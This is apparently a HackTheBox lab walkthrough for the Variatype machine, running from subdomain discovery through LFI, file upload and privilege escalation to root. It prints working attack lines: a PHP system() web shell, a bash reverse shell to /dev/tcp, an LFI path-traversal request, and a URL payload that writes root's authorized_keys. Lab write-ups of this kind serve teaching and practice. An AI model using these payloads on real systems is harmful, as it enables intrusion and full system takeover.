# HackTheBox - Variatype Walkthrough

## Overview

Variatype is a Linux-based HackTheBox machine that focuses on web application exploitation and privilege escalation.

The attack starts with subdomain enumeration, leading to an exposed Git repository containing credentials. After authentication, a Local File Inclusion vulnerability in the download functionality allows reading sensitive files. The application also contains an insecure font processing workflow that can be abused to achieve Remote Code Execution.

After gaining initial access as `www-data`, privilege escalation is performed by abusing a vulnerable FontForge processing flow to obtain a shell as another user. Finally, a sudo-permitted Python script is exploited to write an SSH key into the root account and gain full system access.

## Skills Practiced

- Subdomain Enumeration
- Git Repository Exposure
- Local File Inclusion (LFI)
- File Upload Exploitation
- Remote Code Execution (RCE)
- CVE Exploitation
- Linux Privilege Escalation
- Sudo Abuse

## Disclaimer

This walkthrough is for educational purposes only and should only be
used in authorized labs such as HackTheBox.

------------------------------------------------------------------------

# Enumeration

## Port Scanning

```bash
nmap -sC -sV -p- -Pn $ip -o nmap
```

Found:

    port : 22,80

## Subdomain Discovery

Used `ffuf` for virtual host discovery.

``` bash
ffuf -u http://variatype.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.variatype.htb"
```

Found:

    portal.variatype.htb

------------------------------------------------------------------------

# Web Enumeration

Directory brute force:

``` bash
gobuster dir -u http://portal.variatype.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -x php
```

Interesting endpoints:

    .git
    auth.php
    dashboard.php
    download.php
    files/

------------------------------------------------------------------------

# Git Exposure

The exposed Git repository revealed credentials:

    gitbot : REDACTED

------------------------------------------------------------------------

# LFI Discovery

The download functionality accepted a parameter.

Using Arjun:

``` bash
arjun -u http://portal.variatype.htb/download.php
```

Parameter discovered:

    f

Testing:

``` bash
curl "http://portal.variatype.htb/download.php?f=../../../../etc/passwd"
```

The application was vulnerable to Local File Inclusion.

------------------------------------------------------------------------

# Initial Access

A malicious designspace file was created with PHP command execution.

Payload:

``` xml
<?php system($_GET["cmd"]);?>
```

After uploading:

    /files/shell.php

Command execution was achieved:

``` bash
curl "http://portal.variatype.htb/files/shell.php?cmd=id"
```

Result:

    uid=33(www-data)

------------------------------------------------------------------------

# Reverse Shell

Payload:

``` bash
bash -c 'sh -i >& /dev/tcp/<ip>/1234 0>&1'
```

Received shell:

    www-data

------------------------------------------------------------------------

# Privilege Escalation to Steve

Found application files:

``` bash
find / -name app.py 2>/dev/null
```

The application executed FontForge.

Process monitoring with pspy showed:

    /home/steve/bin/process_client_submissions.sh

running as:

    steve

A FontForge related vulnerability was exploited using:

    CVE-2024-25082
    CVE-2024-25081

This resulted in a shell as:

    steve

------------------------------------------------------------------------

# User Flag

``` bash
cat user.txt
```

    REDACTED

------------------------------------------------------------------------

# Root Privilege Escalation

Check sudo permissions:

``` bash
sudo -l
```

Allowed:

    (root) NOPASSWD:
    /usr/bin/python3 /opt/font-tools/install_validator.py *

There is a CVE in packageIndex.download, levearaging to upload /root/.ssh/authorized_keys allowed writing arbitrary files through a URL. (CVE-2024-25082, CVE-2024-25081)

Generated SSH key and hosted:

    authorized_keys

Payload executed:

``` bash
sudo /usr/bin/python3 /opt/font-tools/install_validator.py "http://<ip>:8000/%2Froot%2F.ssh%2Fauthorized_keys"
```

The key was written to:

    /root/.ssh/authorized_keys

------------------------------------------------------------------------

# Root Access

Login:

``` bash
ssh root@variatype -i id_rsa
```

Verify:

``` bash
whoami
```

Output:

    root

------------------------------------------------------------------------

# Root Flag

``` bash
cat root.txt
```

    REDACTED

------------------------------------------------------------------------

# Attack Chain

    Subdomain Discovery
            |
            v
    Git Exposure
            |
            v
    Credentials Leak
            |
            v
    LFI
            |
            v
    PHP Upload / RCE
            |
            v
    www-data Shell
            |
            v
    FontForge Exploit
            |
            v
    Steve Access
            |
            v
    Sudo Abuse
            |
            v
    Root Access

------------------------------------------------------------------------

# Lessons Learned

-   Do not expose `.git` directories.
-   Validate file download parameters.
-   Never execute uploaded files.
-   Run scheduled processes with least privilege.
-   Avoid allowing privileged scripts to download arbitrary URLs.
